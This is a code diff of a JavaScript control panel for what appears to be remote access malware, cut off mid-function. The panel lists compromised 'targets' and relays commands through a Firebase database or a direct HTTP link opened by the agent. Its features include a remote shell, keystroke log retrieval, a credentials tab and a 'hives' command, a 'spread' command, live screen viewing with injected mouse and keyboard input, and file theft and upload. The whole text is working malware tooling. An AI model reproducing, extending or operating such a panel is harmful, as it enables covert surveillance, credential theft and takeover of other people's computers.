-async function call(m,p,b){
-  if(BASE){
+/* ---------- transport ---------- */
+async function fbGet(p){ try{const r=await fetch(FB+"/"+p+".json");return await r.json()}catch(e){return null} }
+async function fbPut(p,b){ return fetch(FB+"/"+p+".json",{method:"PUT",body:JSON.stringify(b)}) }
+async function fbDel(p){ return fetch(FB+"/"+p+".json",{method:"DELETE"}) }
+
+async function rpc(c,a){
+  if(MODE==="direct"&&DBASE){
     const t0=performance.now();
-    const r=await fetch(BASE+"/cmd",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({c:p,...b})});
-    const j=await r.json(); $("#conn").textContent="direct "+(performance.now()-t0).toFixed(0)+"ms"; return j;
+    const r=await fetch(DBASE+"/cmd",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({c,...a})});
+    LAT=Math.round(performance.now()-t0); $("#lat").textContent=LAT+" ms";
+    return await r.json();
   }
-  const r=await fetch(FB+"/"+p+".json",{method:m,body:b?JSON.stringify(b):null});
-  try{return await r.json()}catch(e){return null}
+  const tid=Date.now().toString(36)+"-"+(seq++).toString(36);
+  await fbPut("tasks/"+cur+"/"+tid,{c,st:"queued",ts:Math.floor(Date.now()/1000),...a});
+  for(let i=0;i<95;i++){
+    await slp(750);
+    const r=await fbGet("results/"+cur+"/"+tid);
+    if(r) return r;
+  }
+  return {ok:false,out:"timeout"};
 }
-const getF=p=>fetch(FB+"/"+p+".json").then(r=>r.json()).catch(()=>null);
 
-function toast(msg,cls,spin){
+/* ---------- toast ---------- */
+function toast(m,cls,spin){
   const d=document.createElement("div"); d.className="tst "+(cls||"");
-  d.innerHTML=(spin?'<span class="sp"></span>':"")+"<span>"+esc(msg)+"</span>";
+  d.innerHTML=(spin?'<span class="sp"></span>':"")+"<span>"+esc(m)+"</span>";
   $("#toasts").appendChild(d); return d;
 }
-function done(el,msg,ok){
-  el.className="tst "+(ok?"ok":"er"); el.innerHTML="<span>"+(ok?"✓ ":"✕ ")+esc(msg)+"</span>";
-  setTimeout(()=>{el.style.opacity=0;setTimeout(()=>el.remove(),250)},2600);
+function settle(el,msg,ok){
+  el.className="tst "+(ok?"ok":"er");
+  el.innerHTML="<span>"+(ok?"✓ ":"✕ ")+esc(msg)+"</span>";
+  setTimeout(()=>{el.style.opacity=0;setTimeout(()=>el.remove(),260)},2600);
 }
 
-let SEQ=0;
+/* ---------- dispatch ---------- */
 async function send(c,a={},label){
   if(!cur) return null;
   const lb=label||c;
-  const t=toast(lb+" …","",true);
-  if(BASE){
-    try{
-      const r=await call("POST",c,a);
-      done(t, lb+(r.ok?" ok":" failed"), r.ok);
-      push(c,lb,r); route(c,r); return r;
-    }catch(e){ done(t,lb+" link lost",false); BASE=null; $("#conn").textContent="firebase"; $("#conn").className=""; throw e }
-  }
-  const tid=Date.now().toString(36)+"-"+(SEQ++).toString(36);
-  await fetch(FB+"/tasks/"+cur+"/"+tid+".json",{method:"PUT",body:JSON.stringify({c,st:"queued",ts:Math.floor(Date.now()/1000),...a})});
-  const poll=async n=>{
-    const r=await getF("results/"+cur+"/"+tid);
-    if(r){ done(t, lb+(r.ok?" ok":" failed"), r.ok); push(c,lb,r); route(c,r); return }
-    if(n>90){ done(t,lb+" timeout",false); return }
-    setTimeout(()=>poll(n+1),800);
-  };
-  poll(0);
+  const t=toast(lb,"",true);
+  $("#bar").classList.add("on");
+  try{
+    const r=await rpc(c,a);
+    settle(t,lb+(r.ok?" ✓":" ✕"),r.ok);
+    RES.unshift({c,l:lb,ok:!!r.ok,o:r.out,ts:Date.now()});
+    if(RES.length>200)RES.pop();
+    drawR(); route(c,r);
+    return r;
+  }catch(e){
+    settle(t,lb+" · link lost",false);
+    if(MODE==="direct"){ MODE="fb"; DBASE=null; paintMode() }
+    return {ok:false,out:String(e)};
+  }finally{ $("#bar").classList.remove("on") }
 }
-function push(c,l,r){ RES.unshift({c,l,ok:!!r.ok,o:r.out,ts:Date.now()}); if(RES.length>200)RES.pop(); drawR() }
-const S=o=>typeof o==="string"?o:JSON.stringify(o,null,1);
-const isB=o=>typeof o==="string"&&o.length>700&&/^[A-Za-z0-9+/=\s]+$/.test(o.slice(0,100));
+
+const isB=o=>typeof o==="string"&&o.length>700&&/^[A-Za-z0-9+/=\s]+$/.test(o.slice(0,90));
 
 function route(c,r){
   const o=r.out, tab=tabOn();
   if(tab==="con") $("#co").textContent=S(o);
   if(Array.isArray(o)&&tab==="fil") drawF(o);
-  if(c==="proc"&&typeof o==="string") { PR=parseP(o); drawP() }
-  if(tab==="svc") $("#so").textContent=S(o);
-  if(tab==="reg") $("#ro").textContent=S(o);
-  if(tab==="clp") $("#clo").textContent=S(o);
-  if(tab==="net") $("#no").textContent=S(o);
-  if(tab==="cre") $("#cro").textContent=S(o);
-  if(tab==="rdp") $("#rdpo").textContent=S(o);
+  if(c==="proc"&&typeof o==="string"){ PR=parseP(o); drawP() }
+  const map={svc:"#so",reg:"#ro",clp:"#clo",net:"#no",cre:"#cro",sys:"#syo",rdp:"#rdpo"};
+  if(map[tab]) $(map[tab]).textContent=S(o);
   if(c==="info"&&typeof o==="object") meta(o);
-  if((c==="shot"||c==="cam")&&isB(o)) gal(o);
+  if(c==="shot"&&isB(o)) gal(o);
+  if(c==="pubip"&&r.ok) toast("public ip "+String(o).trim(),"ok");
   if(c==="hives"&&Array.isArray(o)) $("#cro").textContent=S(o);
 }
 
+/* ---------- rail ---------- */
 function render(){
   const now=Date.now()/1000;
   const ids=Object.keys(DEV).filter(id=>{
@@ -231,97 +314,113 @@ function render(){
     const on=now-(v.last||0)<50;
     if(FIL==="on"&&!on) return false;
     if(FIL==="adm"&&!v.admin) return false;
-    if(Q){const s=((v.host||"")+(v.user||"")+(v.ip||"")).toLowerCase(); if(!s.includes(Q)) return false}
+    if(Q){ const s=((v.host||"")+(v.user||"")+(v.ip||"")).toLowerCase(); if(!s.includes(Q)) return false }
     return true;
   }).sort((a,b)=>(DEV[b].last||0)-(DEV[a].last||0));
-  let on=0; Object.values(DEV).forEach(v=>{if(v&&now-(v.last||0)<50)on++});
+  let on=0; Object.values(DEV).forEach(v=>{ if(v&&now-(v.last||0)<50) on++ });
   $("#cnt").textContent=on+"/"+Object.keys(DEV).length;
-  $("#list").innerHTML = ids.length? "" : '<div style="padding:12px;color:#4b6478;font-size:11px;text-align:center">none</div>';
+  const L=$("#list");
+  if(!ids.length){ L.innerHTML='<div class="emptyhint">no targets</div>'; return }
+  L.innerHTML="";
   ids.forEach(id=>{
-    const v=DEV[id], on2=now-(v.last||0)<50;
+    const v=DEV[id], on2=now-(v.last||0)<50, osi=osIcon(v);
     const d=document.createElement("div");
     d.className="dev"+(on2?" on":"")+(id===cur?" sel":"");
-    d.innerHTML=`<div class="av">${esc((v.host||"?").slice(0,2).toUpperCase())}</div>
-      <div><div class="nm">${esc(v.host||id)} ${v.admin?'<span class="bdg">ADMIN</span>':""}</div>
-      <div class="sub"><span>${esc(v.user||"?")}</span><span>${esc(v.ip||"")}</span><span>${on2?"now":ago(v.last)}</span></div></div>
-      <span class="dot"></span>`;
-    d.onclick=()=>openD(id);
-    $("#list").appendChild(d);
+    d.innerHTML=`<div class="avwrap"><div class="av">${esc((v.host||"?").slice(0,2).toUpperCase())}</div></div>
+      <div style="min-width:0"><div class="nm">${osi?`<span class="os">${osi}</span>`:""}${esc(v.host||id)}
+      ${v.admin?'<span class="bdg">ADMIN</span>':""}</div>
+      <div class="sub"><span>${esc(v.user||"?")}</span><span>${esc(v.ip||"")}</span>
+      <span>${on2?"now":ago(v.last)}</span></div></div><span class="dot"></span>`;
+    d.onclick=()=>{ openD(id); if(innerWidth<860) railToggle(false) };
+    L.appendChild(d);
   });
 }
-const ago=t=>{if(!t)return"never";const s=Date.now()/1000-t;return s<60?Math.floor(s)+"s":s<3600?Math.floor(s/60)+"m":Math.floor(s/3600)+"h"};
+const osIcon=v=>{ const o=String(v.info?.os||"").toLowerCase();
+  if(o.includes("windows")||o.includes("microsoft")) return "🪟";
+  if(o.includes("linux")) return "🐧"; if(o.includes("darwin")||o.includes("mac")) return "🍎"; return "▣" };
+const ago=t=>{ if(!t) return "never"; const s=Date.now()/1000-t;
+  return s<60?Math.floor(s)+"s":s<3600?Math.floor(s/60)+"m":Math.floor(s/3600)+"h" };
 
+/* ---------- device ---------- */
 function openD(id){
-  cur=id; lastSel=id; localStorage.setItem("last",id);
+  cur=id; localStorage.setItem("last",id);
   $("#empty").style.display="none"; $("#dv").classList.add("on");
-  tabs(); quick(); hdr(); render(); $("#co").textContent="ready";
+  $("#co").textContent="ready"; tabs(); quick(); hdr(); render();
   if(!DEV[id]?.info) send("info");
 }
 function hdr(){
   const v=DEV[cur]||{}, i=v.info||{};
   $("#dn").textContent=v.host||cur;
+  $("#dos").textContent=osIcon(v);
   $("#dm").innerHTML=[v.admin?'<span class="bdg">ADMIN</span>':"",`<span>${esc(v.user||"?")}</span>`,
-    `<span>${esc(v.ip||"")}</span>`, i.os?`<span>${esc(String(i.os).split("\n")[0])}</span>`:"",
+    `<span>${esc(v.ip||"")}</span>`,i.os?`<span>${esc(String(i.os).split("\n")[0])}</span>`:"",
     `<span>last ${ago(v.last)}</span>`].filter(Boolean).join("");
 }
-function meta(i){ if(!cur)return; DEV[cur].info=i; hdr() }
+function meta(i){ if(!cur) return; DEV[cur].info=i; hdr() }
 
 const QUICK=[["ping",()=>send("ping")],["info",()=>send("info")],["shot",()=>send("shot")],
- ["live",()=>{$$("#tabs button").find(b=>b.dataset.k==="liv").click()}],["files",()=>{$$("#tabs button").find(b=>b.dataset.k==="fil").click()}],
- ["rdp",()=>{$$("#tabs button").find(b=>b.dataset.k==="rdp").click()}],["lock",()=>send("lock")],
- ["reboot",()=>send("power",{mode:"r"})],["spread",()=>send("spread")],["hives",()=>send("hives")]];
+ ["live",()=>tabJump("liv")],["files",()=>tabJump("fil")],["rdp",()=>tabJump("rdp")],
+ ["lock",()=>send("lock")],["reboot",()=>send("power",{mode:"r"})],
+ ["spread",()=>send("spread")],["hives",()=>send("hives")]];
 function quick(){
-  $("#quick").innerHTML="";
-  QUICK.forEach(([n,f])=>{const b=document.createElement("button");b.textContent=n;b.onclick=f;$("#quick").appendChild(b)});
+  const q=$("#quick"); q.innerHTML="";
+  QUICK.forEach(([n,f])=>{ const b=document.createElement("button"); b.textContent=n; b.onclick=f; q.appendChild(b) });
 }
+const tabJump=k=>{ const b=$$("#tabs button").find(x=>x.dataset.k===k); if(b) b.click() };
 
 const TABS=[["con","console"],["fil","files"],["liv","live"],["key","keylog"],["cap","capture"],
- ["prc","processes"],["svc","services"],["reg","registry"],["clp","clipboard"],["net","network"],
- ["rdp","rdp"],["cre","creds"],["ops","ops"],["res","results"]];
+ ["prc","proc"],["svc","svc"],["reg","reg"],["clp","clip"],["net","net"],["rdp","rdp"],
+ ["cre","creds"],["sys","system"],["ops","ops"],["res","results"]];
 function tabs(){
   const t=$("#tabs"); t.innerHTML="";
   TABS.forEach(([k,n],i)=>{
     const b=document.createElement("button"); b.textContent=n; b.dataset.k=k;
-    if(i===0)b.classList.add("on");
-    b.onclick=()=>{$$(".pane").forEach(p=>p.classList.remove("on"));$$("#tabs button").forEach(x=>x.classList.remove("on"));
+    if(i===0) b.classList.add("on");
+    b.onclick=()=>{ $$(".pane").forEach(p=>p.classList.remove("on"));
+      $$("#tabs button").forEach(x=>x.classList.remove("on"));
       $("#p-"+k).classList.add("on"); b.classList.add("on");
-      if(k==="key") loadK(); if(k==="prc"&&!PR.length) send("proc"); if(k==="res") drawR();
-      if(k!=="liv"&&live) stopL()};
+      if(k==="key") loadK(); if(k==="prc"&&!PR.length) send("proc");
+      if(k==="res") drawR(); if(k!=="liv"&&live) stopL() };
     t.appendChild(b);
   });
   foot();
 }
 const tabOn=()=>$("#tabs button.on")?.dataset.k;
+
 function foot(){
   const f=$("#foot"); f.innerHTML="";
   if(ROLE!=="admin"){
-    ["shot","info","ping"].forEach(n=>{const b=document.createElement("button");b.textContent=n;
-      b.onclick=()=>send(n);f.appendChild(b)});
-    f.innerHTML+='<span style="font-size:10px;color:var(--dim)">read-only</span>'; return;
+    [["shot",()=>send("shot")],["info",()=>send("info")],["ping",()=>send("ping")]]
+      .forEach(([n,g])=>{const b=document.createElement("button");b.textContent=n;b.onclick=g;f.appendChild(b)});
+    f.insertAdjacentHTML("beforeend",'<span style="font-size:10px;color:var(--dim)">read-only</span>');
+    return;
   }
-  [["shell",()=>exec()],["shot",()=>send("shot")],["live",()=>{$$("#tabs button").find(b=>b.dataset.k==="liv").click()}],
-   ["files",()=>{$$("#tabs button").find(b=>b.dataset.k==="fil").click()}],["keylog",()=>send("keylog",{on:true})],
-   ["lock",()=>send("lock")],["reboot",()=>send("power",{mode:"r"})],["uninstall",()=>send("uninst")]]
-   .forEach(([n,f2])=>{const b=document.createElement("button");b.textContent=n;b.onclick=f2;f.appendChild(b)});
+  [["shell",()=>exec()],["shot",()=>send("shot")],["live",()=>tabJump("liv")],
+   ["files",()=>tabJump("fil")],["keylog",()=>send("keylog",{on:true})],
+   ["lock",()=>send("lock")],["reboot",()=>send("power",{mode:"r"})],
+   ["uninstall",()=>send("uninst")]]
+   .forEach(([n,g])=>{const b=document.createElement("button");b.textContent=n;b.onclick=g;f.appendChild(b)});
 }
 
-function exec(){const c=$("#ic").value; if(!c)return; send("exec",{cmd:c},c); $("#ic").value=""}
-async function ls(){ const p=$("#fp").value||"C:\\"; const r=await send("ls",{path:p},null); if(r) drawF(r.out) }
+/* ---------- panes ---------- */
+function exec(){ const c=$("#ic").value; if(!c) return; send("exec",{cmd:c},c); $("#ic").value="" }
+async function ls(){ const p=$("#fp").value||"C:\\"; const r=await send("ls",{path:p},"ls"); if(r?.ok) drawF(r.out) }
 function drawF(a){
   const t=$("#fl"); t.innerHTML="";
-  if(!Array.isArray(a)){t.innerHTML=`<tr><td colspan="4">${esc(S(a))}</td></tr>`;return}
+  if(!Array.isArray(a)){ t.innerHTML=`<tr><td colspan="4">${esc(S(a))}</td></tr>`; return }
   a.forEach(f=>{
     const tr=document.createElement("tr");
-    tr.innerHTML=`<td>${f.d?"📁":"📄"} ${esc(f.n)}</td><td>${f.d?"":kb(f.s)}</td><td>${f.m?new Date(f.m*1000).toLocaleString():""}</td><td></td>`;
+    tr.innerHTML=`<td>${f.d?"📁":"📄"} ${esc(f.n)}</td><td>${f.d?"":kb(f.s)}</td>
+      <td>${f.m?new Date(f.m*1000).toLocaleString():""}</td><td></td>`;
     const td=tr.lastElementChild;
-    if(f.d){td.appendChild(mk("open",()=>{$("#fp").value=jn($("#fp").value,f.n);ls()}))}
+    if(f.d) td.appendChild(mk("open",()=>{ $("#fp").value=jn($("#fp").value,f.n); ls() }));
     else td.appendChild(mk("get",()=>dl(f.n)));
     t.appendChild(tr);
   });
 }
 const kb=n=>n>1048576?(n/1048576).toFixed(1)+" MB":n>1024?(n/1024).toFixed(1)+" KB":n+" B";
 const jn=(a,b)=>a.replace(/\\$/,"")+"\\"+b;
-const mk=(t,f)=>{const b=document.createElement("button");b.textContent=t;b.style.padding="2px 8px";b.style.fontSize="11px";b.onclick=f;return b};
+const mk=(t,g)=>{const b=document.createElement("button");b.textContent=t;b.style.padding="2px 8px";b.style.fontSize="11px";b.onclick=g;return b};
 function up(){ $("#fp").value=$("#fp").value.replace(/\\[^\\]*$/,"")||"C:\\"; ls() }
 function pick(){ $("#fi").click() }
 
@@ -330,148 +429,243 @@ async function dl(name){
   const r=await send("dl",{path,uid},"get "+name);
   if(!r?.ok) return;
   let m=null;
-  for(let i=0;i<80;i++){ await slp(700); m=await getF("xfer/"+uid+"/meta"); if(m?.chunks>0){await slp(800);m=await getF("xfer/"+uid+"/meta");break} }
+  for(let i=0;i<80;i++){ await slp(700); m=await fbGet("xfer/"+uid+"/meta");
+    if(m?.chunks>0){ await slp(800); m=await fbGet("xfer/"+uid+"/meta"); break } }
   if(!m?.chunks) return toast("transfer failed","er");
   const parts=[];
-  for(let i=0;i<m.chunks;i++){ const c=await getF(`xfer/${uid}/c/${i}`); if(c)parts.push(b64(c)) }
-  const a=document.createElement("a"); a.href=URL.createObjectURL(new Blob(parts)); a.download=m.name||name; a.click();
-  done(toast("saving "+name),name+" saved",true);
+  for(let i=0;i<m.chunks;i++){ const c=await fbGet(`xfer/${uid}/c/${i}`); if(c) parts.push(b64(c)) }
+  const a=document.createElement("a");
+  a.href=URL.createObjectURL(new Blob(parts)); a.download=m.name||name; a.click();
+  toast("saved "+name,"ok");
 }
-const b64=s=>{const t=atob(s.replace(/\s/g,"")),u=new Uint8Array(t.length);for(let i=0;i<t.length;i++)u[i]=t.charCodeAt(i);return u};
+const b64=s=>{const t=atob(s.replace(/\s/g,"")),u=new Uint8Array(t.length);
+  for(let i=0;i<t.length;i++)u[i]=t.charCodeAt(i);return u};
 
 async function upfile(f){
   if(!f) return;
-  const dest=jn($("#fp").value,f.name), uid="u"+Date.now().toString(36), CH=180000, n=Math.ceil(f.size/CH);
-  const t=toast("uploading "+f.name+" 0%","",true);
+  const dest=jn($("#fp").value,f.name), uid="u"+Date.now().toString(36);
+  const CH=180000, n=Math.ceil(f.size/CH);
+  $("#uprog").style.display="block";
+  const t=toast("uploading "+f.name,"",true);
   for(let i=0;i<n;i++){
     const b=new Uint8Array(await f.slice(i*CH,(i+1)*CH).arrayBuffer());
     let s=""; for(const x of b) s+=String.fromCharCode(x);
-    await fetch(FB+`/xfer/${uid}/c/${i}.json`,{method:"PUT",body:JSON.stringify(btoa(s))});
-    t.lastChild.textContent="uploading "+f.name+" "+Math.round((i+1)/n*100)+"%";
+    await fbPut(`xfer/${uid}/c/${i}`,btoa(s));
+    const pct=Math.round((i+1)/n*100);
+    $("#upbar").style.width=pct+"%"; $("#uptxt").textContent=pct+"% · "+f.name;
+    t.lastChild.textContent="uploading "+pct+"%";
   }
-  await fetch(FB+`/xfer/${uid}/meta.json`,{method:"PUT",body:JSON.stringify({name:f.name,size:f.size,chunks:n})});
+  await fbPut(`xfer/${uid}/meta`,{name:f.name,size:f.size,chunks:n});
   await send("ul",{uid,path:dest},"put "+f.name);
-  done(t,f.name+" sent",true); setTimeout(ls,1200);
+  settle(t,f.name+" sent",true);
+  setTimeout(()=>{ $("#uprog").style.display="none"; $("#upbar").style.width=0; ls() },1200);
 }
 
 function liveT(){ live?stopL():startL() }
 async function startL(){
   if(!cur) return;
-  await send("live",{on:true});
+  await send("live",{on:true},"live");
   live=true; $("#lvb").textContent="stop";
   lvT=setInterval(async()=>{
-    const f=await getF("live/"+cur+"/frame");
+    const f=await fbGet("live/"+cur+"/frame");
     if(f?.d){ $("#img").src="data:image/jpeg;base64,"+f.d; $("#li").textContent=new Date(f.ts).toLocaleTimeString() }
-  },420);
+  },430);
 }
-async function stopL(){ if(!live)return; live=false; clearInterval(lvT); $("#lvb").textContent="start"; if(cur) await send("live",{on:false}) }
+async function stopL(){ if(!live) return; live=false; clearInterval(lvT); $("#lvb").textContent="start"; if(cur) await send("live",{on:false},"live off") }
 
 function pt(e){
   const r=$("#img").getBoundingClientRect();
-  const i=DEV[cur]?.info?.disks?1920:1920;
-  return {x:Math.round((e.clientX-r.left)/r.width*1920), y:Math.round((e.clientY-r.top)/r.height*1080), b:$("#lb").value};
+  const res=DEV[cur]?.info?.disks&&1920||1920;
+  return {x:Math.round((e.clientX-r.left)/r.width*1920),
+          y:Math.round((e.clientY-r.top)/r.height*1080), b:$("#lb").value};
 }
 $("#img").addEventListener("click",async e=>{
-  if(!live)return; const p=pt(e);
-  await fetch(FB+`/live/${cur}/input/${Date.now()}a.json`,{method:"PUT",body:JSON.stringify({t:"mouse",x:p.x,y:p.y,b:p.b,d:true,ts:Date.now()})});
-  setTimeout(()=>fetch(FB+`/live/${cur}/input/${Date.now()}b.json`,{method:"PUT",body:JSON.stringify({t:"mouse",x:p.x,y:p.y,b:p.b,d:false,ts:Date.now()+1})}),80);
+  if(!live) return; const p=pt(e);
+  await fbPut(`live/${cur}/input/${Date.now()}a`,{t:"mouse",x:p.x,y:p.y,b:p.b,d:true,ts:Date.now()});
+  setTimeout(()=>fbPut(`live/${cur}/input/${Date.now()}b`,{t:"mouse",x:p.x,y:p.y,b:p.b,d:false,ts:Date.now()+1}),80);
 });
-async function txt(){ const s=$("#lt").value; if(!s||!live)return;
-  await fetch(FB+`/live/${cur}/input/${Date.now()}.json`,{method:"PUT",body:JSON.stringify({t:"text",s,ts:Date.now()})}); $("#lt").value="" }
-async function kbd(v){ if(!live)return; await fetch(FB+`/live/${cur}/input/${Date.now()}.json`,{method:"PUT",body:JSON.stringify({t:"key",vk:+v,ts:Date.now()})}) }
+$("#img").addEventListener("contextmenu",async e=>{
+  e.preventDefault(); if(!live) return;
+  const r=$("#img").getBoundingClientRect();
+  const x=Math.round((e.clientX-r.left)/r.width*1920), y=Math.round((e.clientY-r.top)/r.height*1080);
+  await fbPut(`live/${cur}/input/${Date.now()}c`,{t:"mouse",x,y,b:"right",d:true,ts:Date.now()});
+  setTimeout(()=>fbPut(`live/${cur}/input/${Date.now()}d`,{t:"mouse",x,y,b:"right",d:false,ts:Date.now()+1}),80);
+});
+async function txt(){ const s=$("#lt").value; if(!s||!live) return;
+  await fbPut(`live/${cur}/input/${Date.now()}`,{t:"text",s,ts:Date.now()}); $("#lt").value="" }
+async function kbd(v){ if(!live) return; await fbPut(`live/${cur}/input/${Date.now()}`,{t:"key",vk:+v,ts:Date.now()}) }
 
-async function loadK(){ KL=await getF("keylog/"+cur)||{}; drawK() }
+async function loadK(){ KL=await fbGet("keylog/"+cur)||{}; drawK() }
 function drawK(){
   const f=$("#kf").value.toLowerCase();
-  $("#kl").innerHTML=Object.entries(KL).sort((a,b)=>+a[0]-+b[0])
-    .filter(([,v])=>!f||(v.t||"").toLowerCase().includes(f))
-    .map(([ts,v])=>`<div><span style="color:#4f6b82;font-size:10px">${new Date(+ts).toLocaleTimeString()}</span> ${esc(v.t||"")}</div>`).join("")||'<div style="color:#4b6478">empty</div>';
+  const rows=Object.entries(KL).sort((a,b)=>+a[0]-+b[0])
+    .filter(([,v])=>!f||(v.t||"").toLowerCase().includes(f));
+  $("#kl").innerHTML=rows.map(([ts,v])=>
+    `<div><span style="color:#4c687f;font-size:10px">${new Date(+ts).toLocaleTimeString()}</span> ${esc(v.t||"")}</div>`).join("")
+    ||'<div class="emptyhint">no keystrokes captured</div>';
 }
-async function clr(){ await fetch(FB+"/keylog/"+cur+".json",{method:"DELETE"}); KL={}; drawK() }
+async function clr(){ await fbDel("keylog/"+cur); KL={}; drawK() }
 
 function gal(s){
   const d=document.createElement("div"); d.className="card";
   d.innerHTML=`<img src="data:image/jpeg;base64,${s}" style="width:100%;border-radius:6px;cursor:zoom-in">`;
-  d.firstChild.onclick=()=>{$("#mi").src=d.firstChild.src;$("#modal").classList.add("on")};
-  $("#gal").prepend(d); if($("#gal").children.length>10)$("#gal").lastChild.remove();
+  d.firstChild.onclick=()=>{ $("#mi").src=d.firstChild.src; $("#modal").classList.add("on") };
+  $("#gal").prepend(d); if($("#gal").children.length>10) $("#gal").lastChild.remove();
 }
 function closeM(){ $("#modal").classList.remove("on") }
 
-function parseP(t){ return t.split("\n").slice(1).map(l=>{const m=l.match(/^"([^"]+)","(\d+)","[^"]*","[^"]*","(\d+)/);return m?{n:m[1],p:m[2],m:m[3]}:null}).filter(Boolean) }
+function parseP(t){
+  return t.split("\n").slice(1).map(l=>{
+    const m=l.match(/^"([^"]+)","(\d+)","[^"]*","[^"]*","(\d+)/);
+    return m?{n:m[1],p:m[2],m:m[3]}:null;
+  }).filter(Boolean);
+}
 function drawP(){
   const f=$("#pf").value.toLowerCase(), rows=PR.filter(p=>!f||p.n.toLowerCase().includes(f));
-  $("#pl").innerHTML=rows.map(p=>`<tr><td>${p.p}</td><td>${esc(p.n)}</td><td>${kb(+p.m*1024)}</td><td></td></tr>`).join("");
-  $$("#pl tr").forEach((tr,i)=>tr.lastElementChild.appendChild(mk("kill",()=>send("kill",{pid:rows[i].p}))));
+  $("#pl").innerHTML=rows.map(p=>`<tr><td>${p.p}</td><td>${esc(p.n)}</td><td>${kb(+p.m*1024)}</td><td></td></tr>`).join("")
+    ||'<tr><td colspan="4" class="emptyhint">run refresh</td></tr>';
+  $$("#pl tr").forEach((tr,i)=>{ if(rows[i]) tr.lastElementChild.appendChild(mk("kill",()=>send("kill",{pid:rows[i].p},"kill"))) });
 }
 
-function sv(o){ const n=$("#sn").value; if(n) send("svc",{op:o,name:n}) }
-function cs(){ const t=prompt("clipboard text"); if(t!==null) send("clip",{op:"set",text:t}) }
-function copyRdp(){ const ip=DEV[cur]?.ip||""; navigator.clipboard.writeText("mstsc /v:"+ip); done(toast("copied"),"mstsc /v:"+ip,true) }
+function sv(o){ const n=$("#sn").value; if(n) send("svc",{op:o,name:n},o) }
+function cs(){ const t=prompt("clipboard text"); if(t!==null) send("clip",{op:"set",text:t},"clip set") }
+function copyRdp(){ const ip=DEV[cur]?.ip||""; if(!ip) return toast("no ip known","er");
+  navigator.clipboard.writeText("mstsc /v:"+ip).then(()=>toast("mstsc /v:"+ip,"ok")) }
 
 function drawR(){
   const f=$("#rf").value;
-  $("#rl").innerHTML=RES.filter(r=>f==="all"||(f==="ok"?r.ok:!r.ok))
-    .map(r=>`<div class="card" style="border-left:3px solid ${r.ok?"var(--ok)":"var(--er)"}"><div style="font-size:10px;color:var(--dim)">${new Date(r.ts).toLocaleTimeString()} · ${esc(r.l)}</div><pre style="max-height:110px;margin-top:5px">${esc(S(r.o)).slice(0,700)}</pre></div>`)
-    .join("")||'<div style="color:#4b6478">no results</div>';
+  const rows=RES.filter(r=>f==="all"||(f==="ok"?r.ok:!r.ok));
+  $("#rl").innerHTML=rows.map(r=>
+    `<div class="card" style="border-left:3px solid ${r.ok?"var(--ok)":"var(--er)"}">
+      <div style="font-size:10px;color:var(--dim)">${new Date(r.ts).toLocaleTimeString()} · ${esc(r.l)}</div>
+      <pre style="max-height:110px;margin-top:5px">${esc(S(r.o)).slice(0,700)}</pre></div>`).join("")
+    ||'<div class="emptyhint">nothing yet</div>';
 }
 
-/* ---------- direct ---------- */
-async function directConnect(){
-  if(!cur) return;
-  if(BASE){ BASE=null; $("#conn").textContent="firebase"; $("#conn").className=""; $("#dcbtn").textContent="connect direct"; return done(toast(""),"back to firebase",true) }
-  const t=toast("opening direct channel on "+DIRPORT+" …","",true);
-  await send("httpd",{port:DIRPORT});
-  let net=null;
-  for(let i=0;i<20;i++){ await slp(700); net=await getF("net/"+cur); if(net?.port) break }
-  if(!net?.ip) return done(t,"agent did not report an ip",false);
-  BASE="http://"+net.ip+":"+net.port;
+/* ---------- mode ---------- */
+function paintMode(){
+  $("#mfb").classList.toggle("on",MODE==="fb");
+  $("#mdr").classList.toggle("on",MODE==="direct");
+  $("#connpane").classList.toggle("on",MODE==="direct");
+  const l=$("#link");
+  if(MODE==="direct"&&DBASE){ l.textContent="direct"; l.className="live" }
+  else if(MODE==="direct"){ l.textContent="direct ?"; l.className="dir" }
+  else { l.textContent="fb"; l.className="" }
+  $("#dcb").textContent = (MODE==="direct"&&DBASE) ? "drop link" : "direct";
+}
+function setMode(m){
+  if(m===MODE) return;
+  if(m==="fb"){ MODE="fb"; DBASE=null; paintMode(); toast("back on firebase","ok"); return }
+  MODE="direct"; paintMode();
+  toast("enter an ip and port, then connect","ok");
+}
+async function manualConnect(){
+  const ip=$("#cip").value.trim(), port=$("#cpt").value.trim()||DPORT;
+  if(!ip) return toast("ip required","er");
+  const t=toast("testing "+ip+":"+port,"",true);
   try{
-    const r=await fetch(BASE+"/",{cache:"no-store"}); if(!r.ok) throw 0;
-    $("#conn").textContent="direct"; $("#conn").className="dir";
-    $("#dcbtn").textContent="disconnect";
-    done(t,"DIRECT LINK "+net.ip+":"+net.port,true);
-    toast("all commands now bypass the database","ok");
+    const r=await fetch(`http://${ip}:${port}/`,{cache:"no-store"});
+    if(!r.ok) throw 0;
+    const j=await r.json();
+    DBASE=`http://${ip}:${port}`; MODE="direct";
+    manual[j.id]={host:j.host,user:"direct",ip,last:Date.now()/1000,admin:true,info:{os:"direct link"}};
+    Object.assign(DEV,manual);
+    paintMode(); openD(j.id);
+    settle(t,"LINKED "+ip+":"+port,true);
+    toast("every command now bypasses the database","ok");
   }catch(e){
-    BASE=null; done(t,"cannot reach "+net.ip+":"+net.port+" — forward the port",false);
+    settle(t,"unreachable "+ip+":"+port,false);
+    toast("forward the port, or run open 7443 first","er");
   }
+}
+async function openPort(){
+  if(!cur) return toast("select a device","er");
+  const r=await send("httpd",{port:DPORT},"open "+DPORT);
+  if(!r?.ok) return;
+  let net=null;
+  for(let i=0;i<20;i++){ await slp(700); net=await fbGet("net/"+cur); if(net?.port) break }
+  if(net?.ip){ $("#cip").value=net.ip; $("#cpt").value=net.port;
+    toast("reported "+net.ip+":"+net.port+" — press connect","ok") }
+  else toast("agent did not report an ip","er");
+}
+async function quickDirect(){
+  if(MODE==="direct"&&DBASE){ MODE="fb"; DBASE=null; paintMode(); return toast("link dropped","ok") }
+  setMode("direct");
+  if(cur){ await openPort(); if($("#cip").value) manualConnect() }
+}
+async function dropDevice(){
+  if(!cur) return;
+  const id=cur;
+  await Promise.all(["devices","tasks","results","keylog","live","net","queue"].map(n=>fbDel(n+"/"+id)));
+  delete DEV[id]; delete manual[id]; cur=null;
+  $("#dv").classList.remove("on"); $("#empty").style.display="block";
+  render(); toast("forgotten "+id,"ok");
+}
+async function purgeOffline(){
+  const now=Date.now()/1000;
+  const dead=Object.keys(DEV).filter(id=>now-(DEV[id].last||0)>600);
+  if(!dead.length) return toast("nothing stale","ok");
+  for(const id of dead){
